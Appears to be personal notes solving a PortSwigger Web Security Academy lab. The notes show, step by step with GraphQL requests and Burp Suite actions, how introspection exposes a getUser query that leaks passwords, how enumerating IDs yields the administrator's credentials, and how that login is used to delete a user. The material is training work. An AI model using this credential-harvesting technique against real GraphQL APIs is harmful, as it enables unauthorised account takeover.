
# #PortSwigger 


![[Pasted image 20260702235224.png]]

## Lab Description

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

**Objective:** Sign in as the administrator and delete the username carlos.

---
---

### Step 1: Capture the Login Request

1. In Burp's browser, access the lab
2. Attempt to log in with any credentials
3. In Burp Proxy, find the GraphQL login request

**Example request:**
```
POST /graphql/v1 HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net

mutation {
  login(username: "test", password: "test") {
    token
    user {
      id
      username
    }
  }
}
```

![[Pasted image 20260702235434.png]]


---

### Step 2: Run Introspection

1. Right-click the request --> **Send to Repeater**
2. Right-click in the Request panel --> **GraphQL > Set introspection query**
3. Send the request

![[Pasted image 20260702235841.png]]

---

### Step 3: Save Queries to Site Map

1. Right-click the response --> **GraphQL > Save GraphQL queries to site map**
2. Go to **Target > Site map**

![[Pasted image 20260702235947.png]]


---

### Step 4: Find the `getUser` Query

In the site map, locate the `getUser` query:
```
query getUser($id: Int!) {
  getUser(id: $id) {
    id
    username
    password
  }
}
```


![[Pasted image 20260703000530.png]]


---

### Step 5: Retrieve Administrator Credentials

1. Right-click the `getUser` query --> **Send to Repeater**
2. In Repeater, switch to the **GraphQL tab**
3. Test different `id` values:

**ID 0:**
```
{"id": 0}
```
- No user found.

**ID 1:**
```
{"id": 1}
```
- Administrator credentials returned!

**Response:**
```
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "admin_password_here"
    }
  }
}
```

![[Pasted image 20260703000737.png]]


---

### Step 6: Log In as Administrator

1. Use the retrieved credentials to log in:
    - **Username:** `administrator`
    - **Password:**  `iv2dxtcfakp8i5uaw9lu`

![[Pasted image 20260703000850.png]]

---

### Step 7: Delete Carlos

1. Go to the **Admin panel**
2. Click **Delete** next to `carlos`    

![[Pasted image 20260703000927.png]]


---

### Step 8: Lab Solved

![[Pasted image 20260703000945.png]]

---
---

